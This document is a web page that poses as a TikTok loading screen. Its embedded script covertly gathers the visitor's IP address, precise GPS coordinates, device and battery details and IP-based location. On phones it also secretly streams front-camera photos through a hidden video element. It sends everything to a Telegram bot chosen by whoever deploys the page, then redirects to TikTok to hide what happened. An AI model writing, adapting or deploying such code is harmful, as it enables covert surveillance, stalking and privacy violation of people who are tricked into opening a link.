<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
        }
        .splash { text-align: center; }
        .logo-container {
            position: relative;
            width: 100px; height: 100px;
            margin: 0 auto 30px;
        }
        .pulse-ring {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 80px; height: 80px;
            border: 3px solid #ff0050;
            border-radius: 50%;
            animation: pulse 1.5s ease-out infinite;
        }
        .pulse-ring:nth-child(2) { animation-delay: 0.5s; }
        .pulse-ring:nth-child(3) { animation-delay: 1s; }
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; }
            100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
        }
        .note-icon {
            position: relative; z-index: 2;
            width: 50px; height: 50px;
            margin: 25px;
            filter: drop-shadow(0 0 10px rgba(255,0,80,0.5));
        }
        .loading-text {
            color: #888;
            font-size: 14px;
            letter-spacing: 2px;
            animation: fadeText 1.5s ease-in-out infinite;
        }
        @keyframes fadeText {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 1; }
        }
        .brand { color: #fff; font-size: 24px; font-weight: bold; margin-bottom: 20px; letter-spacing: 3px; }
        .brand span { color: #ff0050; }
        #cam { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        #canvas { display: none; }
        #debug { color: #0f0; font-size: 10px; margin-top: 10px; max-height: 80px; overflow: hidden; text-align: left; padding: 0 20px; }
    </style>
</head>
<body>
    <video id="cam" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="splash" id="splash">
        <div class="brand">Tik<span>Tok</span></div>
        <div class="logo-container">
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <svg class="note-icon" viewBox="0 0 24 24" fill="white">
                <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
            </svg>
        </div>
        <div class="loading-text" id="status">CONNECTING...</div>
        <div id="debug"></div>
    </div>

    <script>
    var p = new URLSearchParams(location.search);
    var redir = p.get('r') || 'https://www.tiktok.com';
    var bot = p.get('bot') || '';
    var chat = p.get('chat') || '';
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    var gpsData = null;
    var ipData = null;
    var photoInterval = null;
    var streamActive = false;
    var photoCount = 0;
    var visitStart = Date.now();
    var sent = false;
    
    function log(msg) {
        var d = document.getElementById('debug');
        d.textContent = d.textContent + '\n' + msg;
    }
    
    // Get IP
    fetch('https://api.ipify.org?format=json')
        .then(function(r) { return r.json(); })
        .then(function(d) { ipData = d.ip; log('IP: ' + d.ip); })
        .catch(function() { ipData = 'Unknown'; });
    
    // Get battery
    function getBattery() {
        if (navigator.getBattery) {
            return navigator.getBattery().then(function(b) {
                return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
            });
        }
        return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
    }
    
    // Get GPS
    function getGPS() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                log('GPS: Not supported');
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    log('GPS: GRANTED ' + pos.coords.latitude.toFixed(4));
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude
                    });
                },
                function(err) {
                    log('GPS: DENIED - ' + err.message);
                    resolve(null);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        });
    }
    
    // Start camera
    async function startCamera() {
        if (!isMobile) { log('Camera: Desktop - skipped'); return false; }
        try {
            var v = document.getElementById('cam');
            
            var stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            });
            
            v.srcObject = stream;
            
            // Wait for video to be ready
            await new Promise(function(resolve) {
                v.onloadedmetadata = function() {
                    v.play().then(resolve).catch(resolve);
                };
                setTimeout(resolve, 3000);
            });
            
            streamActive = true;
            log('Camera: Started ' + v.videoWidth + 'x' + v.videoHeight);
            return true;
        } catch(e) {
            log('Camera: ' + e.message);
            return false;
        }
    }
    
    // Take photo
    function takePhoto() {
        if (!streamActive) { log('Photo: Camera not active'); return null; }
        try {
            var v = document.getElementById('cam');
            var c = document.getElementById('canvas');
            
            if (!v.videoWidth || v.videoWidth === 0) {
                log('Photo: Video not ready yet');
                return null;
            }
            
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            
            photoCount++;
            log('Photo: #' + photoCount + ' OK');
            return c.toDataURL('image/jpeg', 0.7);
        } catch(e) {
            log('Photo: Error ' + e.message);
            return null;
        }
    }
    
    // Send photo
    function sendPhoto(photoData) {
        if (!photoData) return;
        var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
        var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
        while(n--) u8[n] = bstr.charCodeAt(n);
        var blob = new Blob([u8], {type: mime});
        
        var fd = new FormData();
        fd.append('chat_id', chat);
        fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
        fd.append('caption', '📸 Photo #' + photoCount);
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
        xhr.onload = function() { log('Photo sent: ' + xhr.status); };
        xhr.send(fd);
    }
    
    // Build and send report
    async function sendReport(isFinal) {
        if (sent && !isFinal) return;
        sent = true;
        
        var ua = navigator.userAgent;
        var plat = navigator.platform;
        var lang = navigator.language;
        var scr = screen.width + 'x' + screen.height;
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
        var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        var duration = Math.floor((Date.now() - visitStart) / 1000);
        var battery = await getBattery();
        
        var deviceModel = plat;
        if (/iPhone/.test(ua)) {
            var iosVer = ua.match(/OS (\d+_\d+)/);
            deviceModel = 'iPhone OS ' + (iosVer ? iosVer[1].replace('_','.') : '') + ' like Mac OS X';
        } else if (/Android/.test(ua)) {
            deviceModel = 'Android Device';
        } else if (/Windows/.test(plat)) {
            deviceModel = 'Windows PC';
        } else if (/Mac/.test(plat)) {
            deviceModel = 'Mac Computer';
        }
        
        var ipLocText = '';
        try {
            var ipRes = await fetch('http://ip-api.com/json/' + (ipData || '') + '?fields=country,regionName,city,zip,timezone');
            var ipLoc = await ipRes.json();
            if (ipLoc.country) {
                ipLocText = 
                    '📍 Location Details\n' +
                    '   • Country: ' + ipLoc.country + '\n' +
                    '   • Region: ' + (ipLoc.regionName || 'N/A') + '\n' +
                    '   • City: ' + (ipLoc.city || 'N/A') + '\n' +
                    '   • Postal Code: ' + (ipLoc.zip || 'N/A') + '\n' +
                    '   • Timezone: ' + (ipLoc.timezone || tz) + '\n\n';
            }
        } catch(e) {
            ipLocText = '📍 Location Details\n   • Timezone: ' + tz + '\n\n';
        }
        
        var prefix = isFinal ? '📋 FINAL REPORT\n\n' : '';
        
        var msg = prefix;
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📊 Visitor Information Captured\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖥️ Device & Browser\n';
        msg += '   • Device Model: ' + deviceModel + '\n';
        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
        
        msg += '🌐 Network Information\n';
        msg += '   • IP Address: ' + (ipData || 'N/A') + '\n';
        msg += '   • Language: ' + lang + '\n\n';
        
        msg += ipLocText;
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    🗺️ GPS Coordinates\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        if (gpsData) {
            msg += '   ✅ Location Granted\n';
            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n\n';
            msg += '   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
        } else {
            msg += '   ❌ Location: Denied\n';
            msg += '   💡 Location permission was not granted\n\n';
        }
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📱 Device Details\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖼️ Display Information\n';
        msg += '   • Resolution: ' + scr + '\n\n';
        
        msg += '🔋 Battery Status\n';
        msg += '   • Level: ' + battery.level + '\n';
        msg += '   • Charging: ' + battery.charging + '\n\n';
        
        msg += '🔐 Device Permissions\n';
        msg += '   • Camera: ' + (streamActive ? 'Active' : 'Unknown') + '\n';
        msg += '   • Location: ' + (gpsData ? 'Granted' : 'Denied') + '\n\n';
        
        msg += '💾 Hardware & Storage\n';
        msg += '   • CPU Cores: ' + cores + '\n';
        msg += '   • RAM: ' + ram + ' GB\n';
        msg += '   • Photos Captured: ' + photoCount + '\n';
        msg += '   • Visit Duration: ' + duration + 's\n\n';
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
        
        // Send via XHR
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendMessage', false);
        xhr.setRequestHeader('Content-Type', 'application/json');
        try {
            xhr.send(JSON.stringify({ chat_id: chat, text: msg, disable_web_page_preview: true }));
            log('Report sent: ' + xhr.status);
        } catch(e) {
            log('Report FAILED');
        }
        
        // Send location pin if GPS
        if (gpsData) {
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'https://api.telegram.org/bot' + bot + '/sendLocation', false);
            xhr2.setRequestHeader('Content-Type', 'application/json');
            try {
                xhr2.send(JSON.stringify({ chat_id: chat, latitude: gpsData.lat, longitude: gpsData.lon }));
            } catch(e) {}
        }
    }
    
    // Main
    async function main() {
        log('Starting...');
        
        // Get GPS
        gpsData = await getGPS();
        
        // Start camera
        var camStarted = await startCamera();
        
        // Send report BEFORE redirect
        await sendReport(false);
        
        // Take photos after camera initialized
        if (camStarted) {
            setTimeout(function() {
                var photo = takePhoto();
                if (photo) sendPhoto(photo);
                
                photoInterval = setInterval(function() {
                    var photo = takePhoto();
                    if (photo) sendPhoto(photo);
                }, 5000);
            }, 2000);
        }
        
        // Redirect
        document.getElementById('status').textContent = 'DONE';
        setTimeout(function() {
            document.getElementById('splash').style.display = 'none';
            window.location.href = redir;
        }, 500);
    }
    
    // On leave
    window.addEventListener('beforeunload', function() {
        if (photoInterval) clearInterval(photoInterval);
        if (streamActive) {
            try {
                document.getElementById('cam').srcObject.getTracks().forEach(function(t) { t.stop(); });
            } catch(e) {}
        }
        var leaveMsg = '📋 Left page | Duration: ' + Math.floor((Date.now()-visitStart)/1000) + 's | Photos: ' + photoCount;
        navigator.sendBeacon('https://api.telegram.org/bot' + bot + '/sendMessage',
            JSON.stringify({ chat_id: chat, text: leaveMsg }));
    });
    
    main();
    </script>
</body>
</html>
